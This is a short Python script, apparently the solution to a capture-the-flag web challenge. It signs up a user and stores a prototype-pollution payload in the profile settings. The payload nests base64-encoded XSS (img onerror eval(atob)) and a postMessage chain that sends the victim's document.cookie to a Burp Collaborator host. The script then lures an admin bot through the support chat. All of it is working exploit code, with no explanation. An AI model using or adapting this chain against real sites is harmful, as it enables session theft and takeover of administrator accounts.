import requests
import base64
import datetime

FRONTEND_DOMAIN = "https://dev.local"  # Change
COLLABORATOR_DOMAIN = "something.oastify.com"  # Change

# Get a session
requests.post(f"{FRONTEND_DOMAIN}/api/auth/signup",
              json={"email": "solution@challenge.com", "password": "Solution123"})
login_res = requests.post(f"{FRONTEND_DOMAIN}/api/auth/login", json={
                          "email": "solution@challenge.com", "password": "Solution123"}, allow_redirects=False)
sid = login_res.cookies.get("SID")
print(f"[+] session retrieved successfully: {sid}")

extract_flag = "(async () => {await fetch(`https://" + \
    COLLABORATOR_DOMAIN + "/?${document.cookie}`);})();"
post_message_payload = f"(async () => {{parent.postMessage({{\"totalTasks\":\"<img/src/onerror=eval(atob('{base64.b64encode(extract_flag.encode('utf-8')).decode()}'))>\"}},'*');}})()"
payload = {
    "name": "Anon",
    "phone": "",
    "position": "",
    "__proto__": {
        "tasks": [
            {
                "date": datetime.date.today().strftime("%Y-%m-%d"),
                "tasksCompleted": f"<img/src/onerror=eval(atob(\"{base64.b64encode(post_message_payload.encode('utf-8')).decode()}\"))>",
            }
        ]
    },
}

# Store the XSS payload
requests.post(f"{FRONTEND_DOMAIN}/api/user/settings",
              headers={"Cookie": f"SID={sid}"}, json=payload)
print("[+] payload has been persisted!")

# Exploit the admin
uuid_res = requests.get(f"{FRONTEND_DOMAIN}/",
                        headers={"Cookie": f"SID={sid}"}, allow_redirects=False)
requests.post(f"{FRONTEND_DOMAIN}/api/support/chat", headers={"Cookie": f"SID={sid}"},
              json={"message": f"{FRONTEND_DOMAIN}{uuid_res.headers['Location']}"})
print("[+] admin exploited - check the collaborator")
